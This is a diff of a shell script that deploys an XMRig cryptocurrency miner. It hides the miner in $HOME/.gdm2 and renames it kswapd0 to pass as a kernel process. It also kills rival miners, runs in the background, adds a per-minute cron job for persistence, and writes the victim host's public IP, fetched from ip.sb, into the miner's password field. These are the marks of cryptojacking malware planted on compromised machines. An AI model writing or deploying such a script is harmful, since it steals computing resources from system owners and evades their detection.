@@ -238,21 +238,6 @@ echo "[*] Miner $HOME/.gdm2/xmrig is OK"
 
 mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-#PASS=`hostname`
-#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-PASS=`sh -c "(curl -4 ip.sb)"`
-#if [ "$PASS" == "localhost" ]; then
-#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-#fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
-
-
 # preparing script
 
 killall xmrig
@@ -357,6 +342,21 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 cat $HOME/.gdm2/config.json
 
 rm -rf xmrig.tar*
+
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname`
+#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+PASS=`sh -c "(curl -4 ip.sb)"`
+#if [ "$PASS" == "localhost" ]; then
+#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+#fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/'t $HOME/.gdm2/config.json
 
 # Cronjob erstellen
  (crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
